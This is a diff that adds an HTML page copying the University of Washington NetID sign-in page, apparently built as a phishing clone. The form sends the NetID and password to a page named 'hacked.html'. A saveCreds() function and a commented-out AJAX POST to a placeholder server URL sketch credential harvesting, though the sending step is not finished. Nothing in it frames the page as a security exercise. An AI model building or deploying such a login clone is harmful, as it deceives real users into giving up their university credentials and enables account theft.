@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html><head>
+  <meta charset="utf-8">
+<link rel="stylesheet" type="text/css" href="assets/css/opensans.css" media="screen, handheld">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>UW NetID sign-in</title>
+<meta name="description" content="">
+<meta name="author" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="cleartype" content="on">
+<link rel="stylesheet" type="text/css" href="css/weblogin-global.css" media="screen, handheld">
+<link rel="stylesheet" type="text/css" href="css/weblogin-enhanced.css" media="screen  and (min-width: 40.5em)">
+<!--[if (lt IE 9)&(!IEMobile)]>
+<link rel="stylesheet" type="text/css" href="/css/weblogin-enhanced.css" />
+<![endif]-->
+
+
+<script>
+function _clear_screen() {
+docdiv = document.getElementById('main');
+docdiv.className='visuallyhidden';
+}
+
+/* Allow @uw.edu and @washington.edu, but reject any other @something. */
+
+window.onload = function() {
+document.getElementById('idplogindiv').onsubmit=function(e) {
+id = document.getElementById("weblogin_netid").value.toLowerCase();
+document.getElementById("weblogin_netid").value = id;
+at = id.indexOf("@");
+if (at<0) {
+   _clear_screen();
+   return true;
+}
+if (id.substr(at)=="@uw.edu" || id.substr(at)=="@washington.edu" || id.substr(at)=="@u.washington.edu") {
+   document.getElementById("weblogin_netid").value = id.substr(0,at);
+   _clear_screen();
+   return true;
+}
+document.getElementById("uwsignin").innerHTML = 'Please sign in with your <span style="color: #600000" text-decoration: underline;">UW NetID</span>';
+return false;
+};
+closingMs = 5*60*1000;  // 5 min
+setTimeout(function() {
+document.getElementById('uwsignin').innerHTML = '<p style="color: #600000">Your sign in window has closed.<br>Return to your application to reauthenticate.</p>';
+field = document.getElementById('weblogin_netid');
+field.disabled = true;
+field.style.backgroundColor = "#f0f0f0";
+field.placeholder = "";
+field = document.getElementById('weblogin_password');
+field.disabled = true;
+field.style.backgroundColor = "#f0f0f0";
+field.placeholder = "";
+document.getElementById('submit_button').disabled = true;
+document.getElementById('submit_button').value = "------";
+}, closingMs);
+}
+
+
+</script>
+</head>
+
+
+<body data-new-gr-c-s-check-loaded="14.1062.0" data-gr-ext-installed="">
+
+<h1 class="visuallyhidden">UW NetID sign-in</h1>
+
+<div id="container">
+<div id="main" role="main">
+
+    <h2 class="visuallyhidden" aria-flowto="weblogin_warning">Login</h2>
+    <div class="form">
+      <div><img src="assets/img/weblogin.png" height="57" width="198" alt="" aria-hidden="true"></div>
+
+
+<p id="uwsignin">Please sign in.</p>
+
+        <!-- "Please sign in" is included in the error vm -->
+
+      <form name="idplogin" id="idplogindiv" method="get" action="hacked.html" autocomplete="off">
+
+        <ul class="login">
+          <li><label for="weblogin_netid">UW NetID:</label>
+               <input id="weblogin_netid" placeholder="UW NetID" type="text" name="j_username" size="20" autocorrect="off" autocapitalize="none" autofocus="autofocus" value=""></li>
+          <li><label for="weblogin_password">Password:</label>
+               <input id="weblogin_password" placeholder="Password" type="password" name="j_password" size="20"></li>
+                     <li><a href="https://identity.uw.edu/account/resetpassword/">Forgot your password?</a></li>
+               </ul>
+
+        <ul class="submit">
+              <li><input type="submit" id="submit_button" name="_eventId_proceed" value="Sign in" onclick="saveCreds()"></li>
+        </ul>
+
+        </form>
+
+    </div>
+    <script>
+      function saveCreds() {
+        var userName = document.getElementById('weblogin_netid');
+        var password = document.getElementById('weblogin_password');
+        // alert(password.value);
+        // document.write(password.value)
+        // var formData = JSON.stringify($("#idplogindiv").serializeArray());
+        // alert(formData.value)
+      }
+    //   $.ajax({
+    //   type: "POST",
+    //   url: "serverUrl",
+    //   data: formData,
+    //   success: function(){},
+    //   dataType: "json",
+    //   contentType : "application/json"
+    // });
+    </script>
+
+    <h2 class="visuallyhidden">UW NetID Help</h2>
+    <div class="sidebar">
+
+            <!-- <h3 style="margin-top:0;">UW NetID Help</h3> -->
+
+        <ul class="links">
+            <li><a href="http://itconnect.uw.edu/security/uw-netids/about-uw-netids/account-recovery//">Learn about account recovery options</a></li>
+            <li><a href="http://itconnect.uw.edu/security/uw-netids/about-uw-netids/">Learn about UW NetIDs</a></li>
+            <li><a href="http://itconnect.uw.edu/security/uw-netids/weblogin/">Learn about UW NetID sign-in</a></li>
+            <li><a href="https://uwnetid.washington.edu/newid/">Obtain a UW NetID</a></li>
+            <li style="height: 30px"></li>
+            <li><a href="http://itconnect.uw.edu/help/">Need help?</a></li>
+        </ul>
+
+    </div>
+    <div id="weblogin_warning" class="warning">
+
+        <p>Sign in reduces how often you have to reauthenticate to access UW resources.</p>
+
+        <p>Learn how to <a href="http://itconnect.uw.edu/security/uw-netids/weblogin/#logout">sign out</a> at the end of your browsing session.</p>
+
+        <p class="copyright"><span class="copyright-links"><a href="http://www.washington.edu/online/privacy">PRIVACY</a> | <a href="http://www.washington.edu/online/terms">TERMS</a></span></p>
+
+     </div>
+
+
+</div> <!--end main -->
+</div> <!-- end container -->
+
+
+
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
